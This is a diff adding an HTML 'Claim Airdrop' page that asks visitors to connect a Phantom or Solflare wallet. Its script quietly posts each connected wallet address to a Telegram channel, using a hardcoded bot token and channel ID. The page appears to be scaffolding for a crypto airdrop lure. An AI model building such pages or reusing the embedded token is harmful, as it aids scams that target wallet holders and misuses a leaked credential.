@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Airdrop Connect</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0a0a0a;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .button {
+      padding: 12px 20px;
+      background-color: #00ffa3;
+      color: black;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background 0.3s ease;
+    }
+    .button:hover {
+      background-color: #00c27c;
+    }
+    .popup {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+    }
+    .popup-content {
+      background: #1a1a1a;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      width: 300px;
+    }
+    .wallet-option {
+      margin: 10px 0;
+      background: #222;
+      padding: 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .wallet-option:hover {
+      background: #333;
+    }
+  </style>
+</head>
+<body>
+
+<button class="button" onclick="showPopup()">Claim Airdrop</button>
+
+<div class="popup" id="popup">
+  <div class="popup-content">
+    <h3>Connect Wallet</h3>
+    <div class="wallet-option" onclick="connectPhantom()">Phantom</div>
+    <div class="wallet-option" onclick="connectSolflare()">Solflare</div>
+    <div class="wallet-option" onclick="alert('TrustWallet support coming soon')">TrustWallet</div>
+  </div>
+</div>
+
+<script>
+  const BOT_TOKEN = "7675875616:AAEgBrKlJV1K2qgtEt69g8Kzs97YcBZvrBc";
+  const CHANNEL_ID = "-1002652189311"; // Add the "-" prefix
+
+  function showPopup() {
+    document.getElementById('popup').style.display = 'flex';
+  }
+
+  async function sendTelegramMessage(wallet) {
+    const msg = `✅ Wallet ${wallet} Connected To chartdrops.fun`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const body = {
+      chat_id: CHANNEL_ID,
+      text: msg
+    };
+    await fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(body)
+    });
+  }
+
+  async function connectPhantom() {
+    try {
+      const provider = window.solana;
+      if (!provider || !provider.isPhantom) {
+        alert("Phantom Wallet not found.");
+        return;
+      }
+      const resp = await provider.connect();
+      await sendTelegramMessage(resp.publicKey.toString());
+      alert("Wallet connected!");
+      document.getElementById('popup').style.display = 'none';
+    } catch (err) {
+      console.error(err);
+    }
+  }
+
+  async function connectSolflare() {
+    try {
+      const solflare = new window.Solflare();
+      await solflare.connect();
+      if (solflare.publicKey) {
+        await sendTelegramMessage(solflare.publicKey.toString());
+        alert("Wallet connected!");
+        document.getElementById('popup').style.display = 'none';
+      }
+    } catch (err) {
+      console.error(err);
+    }
+  }
+
+  // Load Solflare SDK
+  const solflareScript = document.createElement('script');
+  solflareScript.src = "https://unpkg.com/@solflare-wallet/sdk@latest/dist/index.iife.js";
+  document.head.appendChild(solflareScript);
+</script>
+
+</body>
+</html>
